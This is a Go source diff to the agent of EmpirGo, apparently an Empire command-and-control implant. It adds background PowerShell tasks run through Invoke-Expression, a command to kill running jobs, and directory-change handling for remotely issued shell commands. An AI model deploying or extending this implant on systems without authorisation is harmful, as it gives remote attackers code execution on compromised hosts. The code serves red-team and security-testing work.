@@ -3,6 +3,7 @@ package agent
 import (
 	"EmpirGo/common"
 	"EmpirGo/tasks"
+	"bytes"
 	"encoding/base64"
 	"encoding/json"
 	"fmt"
@@ -11,8 +12,10 @@ import (
 	"math/rand"
 	"net"
 	"os"
+	"os/exec"
 	"path/filepath"
 	"runtime"
+	"strconv"
 	"strings"
 	"time"
 	"unsafe"
@@ -22,6 +25,64 @@ func (ma *MainAgent) powershellTask(data []byte) string {
 	script := string(data)
 	result := tasks.RunPowerShellScript(script)
 	return result
+}
+
+// Backgrounded so long-running scripts don't block the tasking loop. The
+// powershell.exe process is registered in ma.runningJobs so stopRunningJob
+// can kill it.
+func (ma *MainAgent) powershellTaskBackground(data []byte, resultID int) {
+	cmd := exec.Command("powershell", "-NoProfile", "-NonInteractive", "-Command",
+		"$script = [Console]::In.ReadToEnd(); Invoke-Expression $script")
+	cmd.Stdin = strings.NewReader(string(data))
+	var out, stderr bytes.Buffer
+	cmd.Stdout = &out
+	cmd.Stderr = &stderr
+
+	if err := cmd.Start(); err != nil {
+		msg := fmt.Sprintf("Error: failed to start powershell: %v", err)
+		ma.preparepacket(ma.PacketHandler.BuildResponsePacket(112, msg, resultID))
+		return
+	}
+
+	ma.runningJobsMu.Lock()
+	ma.runningJobs[resultID] = cmd
+	ma.runningJobsMu.Unlock()
+
+	ma.preparepacket(ma.PacketHandler.BuildResponsePacket(112, "Job started", resultID))
+
+	go func() {
+		defer func() {
+			ma.runningJobsMu.Lock()
+			delete(ma.runningJobs, resultID)
+			ma.runningJobsMu.Unlock()
+			if r := recover(); r != nil {
+				func() {
+					defer func() { _ = recover() }()
+					msg := fmt.Sprintf("Error: panic in background task: %v", r)
+					ma.preparepacket(ma.PacketHandler.BuildResponsePacket(112, msg, resultID))
+				}()
+			}
+		}()
+
+		var result string
+		if err := cmd.Wait(); err != nil {
+			result = fmt.Sprintf("Error: %v, Output: %s", err, stderr.String())
+		} else {
+			result = out.String()
+		}
+		ma.preparepacket(ma.PacketHandler.BuildResponsePacket(112, result, resultID))
+	}()
+}
+
+func (ma *MainAgent) stopRunningJob(jobID int) bool {
+	ma.runningJobsMu.Lock()
+	cmd, ok := ma.runningJobs[jobID]
+	ma.runningJobsMu.Unlock()
+	if !ok || cmd.Process == nil {
+		return false
+	}
+	_ = cmd.Process.Kill()
+	return true
 }
 
 func (ma *MainAgent) csharpTask(data []byte) string {
@@ -92,6 +153,12 @@ func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int)
 		return "unimplemented"
 	case 40:
 		command := string(data)
+		if dir, ok := parseCdCommand(command); ok {
+			result := changeDirectory(dir)
+			routingPacket := ma.PacketHandler.BuildResponsePacket(40, result, resultID)
+			ma.preparepacket(routingPacket)
+			return ""
+		}
 		result := common.RunCommand(command)
 		routingPacket := ma.PacketHandler.BuildResponsePacket(40, result, resultID)
 		ma.preparepacket(routingPacket)
@@ -118,18 +185,39 @@ func (ma *MainAgent) ProcessPacket(packetType uint16, data []byte, resultID int)
 		routingPacket := ma.PacketHandler.BuildResponsePacket(43, result, resultID)
 		ma.preparepacket(routingPacket)
 		return ""
+	case 44:
+		path := strings.TrimSpace(string(data))
+		result := changeDirectory(path)
+		routingPacket := ma.PacketHandler.BuildResponsePacket(44, result, resultID)
+		ma.preparepacket(routingPacket)
+		return ""
 	case 50:
 		return "unimplemented"
 	case 51:
-		return "unimplemented"
+		jobID, err := strconv.Atoi(strings.TrimSpace(string(data)))
+		if err != nil {
+			ma.preparepacket(ma.PacketHandler.BuildResponsePacket(0, fmt.Sprintf("Error: invalid job id: %v", err), resultID))
+			return ""
+		}
+		var msg string
+		if ma.stopRunningJob(jobID) {
+			msg = fmt.Sprintf("Job %d stopped", jobID)
+		} else {
+			msg = fmt.Sprintf("Job %d not found", jobID)
+		}
+		ma.preparepacket(ma.PacketHandler.BuildResponsePacket(51, msg, resultID))
+		return ""
 	case 60:
 		return "unimplemented"
 	case 70:
 		return "unimplemented"
-	case 100, 101, 102:
+	case 100, 101:
 		result := ma.powershellTask(data)
 		routingPacket := ma.PacketHandler.BuildResponsePacket(112, result, resultID)
 		ma.preparepacket(routingPacket)
+		return ""
+	case 102:
+		ma.powershellTaskBackground(data, resultID)
 		return ""
 	case 120:
 		result := ma.csharpTask(data)
@@ -166,7 +254,7 @@ func getSysinfo(server string, nonce string) string {
 	architecture := runtime.GOARCH
 	version := "1.23"
 
-	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s",
+	return fmt.Sprintf("%s|%s|%s|%s|%s|%s|%s|%s|%s|%d|%s|%s|%s|",
 		nonce, server, "", username, hostname, internalIP, osDetails, highIntegrity, processName, processID,
 		language, version, architecture)
 }
@@ -314,4 +402,37 @@ func (ma *MainAgent) DirectoryListHandler(data string, resultID int) string {
 		return "Error processing directory data"
 	}
 	return string(resultData)
+}
+
+func changeDirectory(path string) string {
+	path = strings.TrimSpace(path)
+	if path == "" {
+		cwd, err := os.Getwd()
+		if err != nil {
+			return fmt.Sprintf("Error: %v", err)
+		}
+		return cwd
+	}
+	if err := os.Chdir(path); err != nil {
+		return fmt.Sprintf("Error: %v", err)
+	}
+	cwd, _ := os.Getwd()
+	return cwd
+}
+
+func parseCdCommand(command string) (string, bool) {
+	trimmed := strings.TrimSpace(command)
+	lower := strings.ToLower(trimmed)
+	if lower == "cd" {
+		return "", true
+	}
+	if len(lower) > 2 && strings.HasPrefix(lower, "cd") {
+		c := trimmed[2]
+		if c == ' ' || c == '\t' {
+			path := strings.TrimSpace(trimmed[3:])
+			path = strings.Trim(path, "\"'")
+			return path, true
+		}
+	}
+	return "", false
 }
